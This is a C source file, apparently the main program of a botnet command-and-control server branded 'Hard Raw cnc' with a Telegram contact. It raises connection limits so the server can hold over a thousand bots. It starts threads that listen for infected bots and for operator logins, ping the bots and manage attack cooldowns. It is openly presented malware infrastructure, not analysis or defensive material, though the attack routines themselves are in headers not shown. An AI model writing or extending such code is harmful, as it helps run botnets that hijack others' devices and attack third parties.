#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include "headers/login_utils.h"
#include "headers/user_handler.h"
#include "headers/botnet.h"

/* Raise the open-file-descriptor limit so the bot listener can hold
   MAX_BOTS connections.  Without this the kernel default (1024) kills
   accept() at ~1000 bots and the whole botnet stalls silently. */
static void raise_fd_limit(void) {
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = FD_HARD_LIMIT;
    if (rl.rlim_max != RLIM_INFINITY && rl.rlim_max < FD_HARD_LIMIT)
        rl.rlim_max = FD_HARD_LIMIT;
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        perror("[warn] setrlimit NOFILE");
        fprintf(stderr, "[warn] run as root or set /etc/security/limits.conf\n");
    }
}

int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);   /* ignore broken-pipe on dead client sockets */

    printf("Hard Raw cnc | t.me/keepspin\n");

    if (argc != 4) {
        fprintf(stderr, "Usage: %s <botport> <threads> <cncport>\n", argv[0]);
        return 1;
    }

    raise_fd_limit();

    g_start_time = time(NULL);
    load_users();

    pthread_t bot_listener_thread, cnc_listener_thread, ping_thread, cooldown_thread;
    int botport = atoi(argv[1]);
    int cncport = atoi(argv[3]);

    pthread_create(&bot_listener_thread, NULL, bot_listener,  &botport);
    pthread_create(&cnc_listener_thread, NULL, cnc_listener,  &cncport);
    pthread_create(&ping_thread,         NULL, ping_bots,     NULL);
    pthread_create(&cooldown_thread,     NULL, manage_cooldown, NULL);

    pthread_join(bot_listener_thread, NULL);
    pthread_join(cnc_listener_thread, NULL);
    pthread_join(ping_thread,         NULL);
    pthread_join(cooldown_thread,     NULL);

    return 0;
}
